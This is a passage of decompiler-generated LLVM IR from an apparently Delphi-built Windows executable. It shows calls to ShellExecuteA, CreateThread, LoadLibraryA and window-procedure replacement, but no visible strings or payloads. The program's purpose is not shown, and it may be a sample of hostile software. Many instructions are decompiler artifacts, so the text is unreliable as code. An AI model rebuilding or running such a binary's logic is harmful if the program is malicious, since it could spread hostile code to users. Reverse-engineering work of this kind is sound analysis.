  store i32 %40, i32* %42, align 4, !insn.addr !1304
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1305
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1306
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1306
  store i32 0, i32* %45, align 4, !insn.addr !1306
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1307
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1307
  store i32 0, i32* %47, align 4, !insn.addr !1307
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1308
  %49 = call i32 @function_4036c8(), !insn.addr !1309
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1310
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1310
  store i32 %49, i32* %51, align 4, !insn.addr !1310
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1311
  %53 = call i32 @function_4060f0(), !insn.addr !1312
  %54 = call i32 @function_4036c8(), !insn.addr !1313
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1314
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1314
  store i32 %54, i32* %56, align 4, !insn.addr !1314
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1315
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1315
  store i32 0, i32* %58, align 4, !insn.addr !1315
  %59 = call i32 @function_4060e8(), !insn.addr !1316
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1317
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1317
  store i32 1, i32* %61, align 4, !insn.addr !1317
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1318
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1318
  store i32 0, i32* %63, align 4, !insn.addr !1318
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1319
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1319
  store i32 0, i32* %65, align 4, !insn.addr !1319
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1320
  %67 = call i32 @function_4036c8(), !insn.addr !1321
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1322
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1322
  store i32 %67, i32* %69, align 4, !insn.addr !1322
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1323
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1323
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1323
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1324
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1324
  store i32 0, i32* %73, align 4, !insn.addr !1324
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1325
  %75 = load i32, i32* %73, align 4, !insn.addr !1326
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1327
  store i32 4219666, i32* %69, align 4, !insn.addr !1328
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1329
  ret i32 %76, !insn.addr !1330
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1331
  ret i32 %0, !insn.addr !1331
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1332
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1333
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1334
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1334
  %ecx.0.reg2mem = alloca i32, !insn.addr !1334
  %esp.0.reg2mem = alloca i32, !insn.addr !1334
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1334
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1334
  store i32 %5, i32* %6, align 4, !insn.addr !1334
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1335
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1335
  %11 = add i8 %8, %10, !insn.addr !1335
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1335
  store i8 %11, i8* %12, align 1, !insn.addr !1335
  %13 = add i32 %2, 58, !insn.addr !1336
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1336
  %15 = load i8, i8* %14, align 1, !insn.addr !1336
  %16 = load i32, i32* %eax, align 4, !insn.addr !1336
  %17 = udiv i32 %16, 256, !insn.addr !1336
  %18 = trunc i32 %17 to i8, !insn.addr !1336
  %19 = add i8 %15, %18, !insn.addr !1336
  store i8 %19, i8* %14, align 1, !insn.addr !1336
  %20 = add i32 %0, 112, !insn.addr !1337
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1337
  %22 = load i8, i8* %21, align 1, !insn.addr !1337
  %23 = trunc i32 %4 to i8, !insn.addr !1337
  %24 = add i8 %22, %23, !insn.addr !1337
  store i8 %24, i8* %21, align 1, !insn.addr !1337
  %25 = trunc i32 %3 to i16, !insn.addr !1338
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1338
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1338
  %27 = load i8, i8* %7, align 4, !insn.addr !1339
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1339
  %30 = add i8 %27, %29, !insn.addr !1339
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1339
  store i8 %30, i8* %31, align 1, !insn.addr !1339
  %32 = load i8, i8* %7, align 4, !insn.addr !1340
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1340
  %35 = add i8 %32, %34, !insn.addr !1340
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1340
  store i8 %35, i8* %36, align 1, !insn.addr !1340
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1341
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1342
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1342
  br label %dec_label_pc_406350, !insn.addr !1342

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1343
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1343
  store i32 0, i32* %39, align 4, !insn.addr !1343
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1344
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1344
  store i32 0, i32* %41, align 4, !insn.addr !1344
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1345
  %43 = icmp eq i32 %42, 0, !insn.addr !1345
  %44 = icmp eq i1 %43, false, !insn.addr !1346
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1346
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1346
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1346

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1347
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1347
  store i32 0, i32* %46, align 4, !insn.addr !1347
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1348
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1348
  store i32 %37, i32* %48, align 4, !insn.addr !1348
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1349
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1349
  store i32 4220396, i32* %50, align 4, !insn.addr !1349
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1350
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1350
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1350
  store i32 %51, i32* %53, align 4, !insn.addr !1350
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1351
  %54 = call i32 @"@LStrPos"(), !insn.addr !1352
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1353
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1353
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1353
  store i32 %57, i32* %56, align 4, !insn.addr !1353
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1354
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1355
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1355
  store i32 %61, i32* %60, align 4, !insn.addr !1355
  %62 = call i32 @function_4034c8(), !insn.addr !1356
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1357
  %64 = add i32 %arg1, -1, !insn.addr !1358
  store i32 %64, i32* %eax, align 4, !insn.addr !1358
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1359
  %66 = icmp slt i32 %65, 5, !insn.addr !1360
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1360
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1360
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1360

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1361
  %68 = call i32 @function_4060f0(), !insn.addr !1362
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1363
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1363
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1364
  %72 = call i32 @function_4060f0(), !insn.addr !1365
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1366
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1366
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1367
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1367
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1367
  store i32 %75, i32* %77, align 4, !insn.addr !1367
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1368
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1368
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1368
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1369
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1369
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1369
  store i32 %80, i32* %82, align 4, !insn.addr !1369
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1370
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1371
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1371
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1372
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1372
  store i32 4220444, i32* %87, align 4, !insn.addr !1372
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1373
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1373
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1373
  store i32 %88, i32* %90, align 4, !insn.addr !1373
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1374
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1374
  store i32 4220460, i32* %92, align 4, !insn.addr !1374
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1375
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1375
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1375
  store i32 %93, i32* %95, align 4, !insn.addr !1375
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1376
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1376
  store i32 4220476, i32* %97, align 4, !insn.addr !1376
  %98 = call i32 @function_407494(), !insn.addr !1377
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1378
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1378
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1379
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1380
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1380
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1381
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1381
  store i32 %106, i32* %105, align 4, !insn.addr !1381
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1382
  %108 = call i32 @function_4060f0(), !insn.addr !1383
  %109 = call i32 @"@LStrPos"(), !insn.addr !1384
  %110 = add i32 %109, -1, !insn.addr !1385
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1386
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1386
  store i32 %110, i32* %112, align 4, !insn.addr !1386
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1387
  %114 = call i32 @function_4060f0(), !insn.addr !1388
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1389
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1390
  store i32 %116, i32* %112, align 4, !insn.addr !1391
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1392
  %118 = call i32 @function_4060f0(), !insn.addr !1393
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1394
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1394
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1395
  %122 = call i32 @function_4060f0(), !insn.addr !1396
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1397
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1398
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1398
  br label %dec_label_pc_4065d1, !insn.addr !1398

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1399
  %125 = icmp slt i32 %124, 5, !insn.addr !1400
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1400
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1400
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1400

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1401
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1401
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1401
  %128 = call i32 @function_404b20(), !insn.addr !1402
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1403
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1403
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1404
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1404
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1404
  %133 = call i32 @function_404b20(), !insn.addr !1405
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1406
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1407
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1408
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1408
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1409
  %140 = call i32 @function_4060f0(), !insn.addr !1410
  %141 = call i32 @function_404c78(), !insn.addr !1411
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1412
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1412
  br label %dec_label_pc_4065d1, !insn.addr !1412

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1413
  %143 = icmp slt i32 %142, 5, !insn.addr !1414
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1414
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1414
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1414

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1415
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1415
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1415
  %146 = call i32 @function_404b20(), !insn.addr !1416
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1417
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1417
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1418
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1418
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1418
  %151 = call i32 @function_404b20(), !insn.addr !1419
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1420
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1421
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1422
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1422
  %157 = call i32 @function_4060f0(), !insn.addr !1423
  %158 = call i32 @function_404c78(), !insn.addr !1424
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1424
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1424
  br label %dec_label_pc_4065d1, !insn.addr !1424

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1425
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1425
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1426
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1427
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1428
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1428
  store i32 4220403, i32* %163, align 4, !insn.addr !1428
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1429
  ret i32 %164, !insn.addr !1430
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1431
  ret i32 %0, !insn.addr !1431
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1432
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1433
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1434
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1435
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1435
  store i32 %1, i32* %2, align 4, !insn.addr !1435
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1436
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1436
  %7 = add i8 %4, %6, !insn.addr !1436
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1436
  store i8 %7, i8* %8, align 1, !insn.addr !1436
  %9 = load i8, i8* %3, align 4, !insn.addr !1437
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1437
  %12 = trunc i32 %11 to i8, !insn.addr !1437
  %13 = add i8 %9, %12, !insn.addr !1437
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1437
  store i8 %13, i8* %14, align 1, !insn.addr !1437
  %15 = load i32, i32* %eax, align 4, !insn.addr !1438
  ret i32 %15, !insn.addr !1438
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(), !insn.addr !1439
  ret i32 %0, !insn.addr !1439
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1440
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1440
  store i8 %2, i8* %3, align 1, !insn.addr !1440
  ret i32 %0, !insn.addr !1440
}

define i32 @function_40666c() local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1441

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1442
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1442

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1443

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1444
  br label %dec_label_pc_4066e4, !insn.addr !1445

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1446
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1447
  %9 = add i32 %0, 20, !insn.addr !1448
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1448
  %11 = load i32, i32* %10, align 4, !insn.addr !1448
  %12 = add i32 %0, 16, !insn.addr !1449
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1449
  %14 = load i32, i32* %13, align 4, !insn.addr !1449
  %15 = add i32 %0, 8, !insn.addr !1450
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1450
  %17 = load i32, i32* %16, align 4, !insn.addr !1450
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1451
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1451
  ret i32 %19, !insn.addr !1452
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1453
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1453
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1454
  ret i32 %4, !insn.addr !1455
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1456
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1456
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1456
  store i8 %3, i8* %4, align 1, !insn.addr !1456
  %5 = add i32 %1, 114, !insn.addr !1457
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1457
  %7 = load i8, i8* %6, align 1, !insn.addr !1457
  %8 = udiv i32 %0, 256, !insn.addr !1457
  %9 = trunc i32 %8 to i8, !insn.addr !1457
  %10 = add i8 %7, %9, !insn.addr !1457
  store i8 %10, i8* %6, align 1, !insn.addr !1457
  %11 = add i8 %2, -32, !insn.addr !1458
  %12 = icmp ult i8 %2, 32, !insn.addr !1458
  %13 = icmp eq i8 %11, 0, !insn.addr !1458
  %14 = zext i8 %11 to i32, !insn.addr !1458
  %15 = and i32 %1, -256, !insn.addr !1458
  %16 = or i32 %15, %14, !insn.addr !1458
  %17 = or i1 %12, %13, !insn.addr !1459
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1459
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1459

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1460
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1460
  %20 = load i8, i8* %19, align 1, !insn.addr !1460
  %21 = and i8 %20, %9, !insn.addr !1460
  store i8 %21, i8* %19, align 1, !insn.addr !1460
  %22 = trunc i32 %arg3 to i16, !insn.addr !1461
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1461
  %24 = load i8, i8* %23, align 1, !insn.addr !1461
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1461
  %25 = add i32 %arg5, 105, !insn.addr !1462
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1462
  %28 = load i8, i8* %27, align 1, !insn.addr !1462
  %29 = udiv i32 %arg2, 256, !insn.addr !1462
  %30 = trunc i32 %29 to i8, !insn.addr !1462
  %31 = and i8 %28, %30, !insn.addr !1462
  store i8 %31, i8* %27, align 1, !insn.addr !1462
  %32 = mul i32 %arg5, 2, !insn.addr !1463
  %33 = add i32 %arg2, 115, !insn.addr !1463
  %34 = add i32 %33, %32, !insn.addr !1463
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1463
  %36 = load i8, i8* %35, align 1, !insn.addr !1463
  %37 = trunc i32 %arg2 to i8, !insn.addr !1463
  %38 = add i8 %36, %37, !insn.addr !1463
  %39 = icmp eq i8 %38, 0, !insn.addr !1463
  store i8 %38, i8* %35, align 1, !insn.addr !1463
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1464
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1464

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1465
  %41 = load i32, i32* %40, align 4, !insn.addr !1465
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1465
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1466
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1466
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1466
  %45 = icmp eq i32* %43, null, !insn.addr !1467
  %46 = icmp eq i1 %45, false, !insn.addr !1468
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1468
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1468

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1469
  %48 = call i32 @function_4036c8(), !insn.addr !1470
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1471
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1472
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1472
  ret i32 %51, !insn.addr !1473

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1474
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1475
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
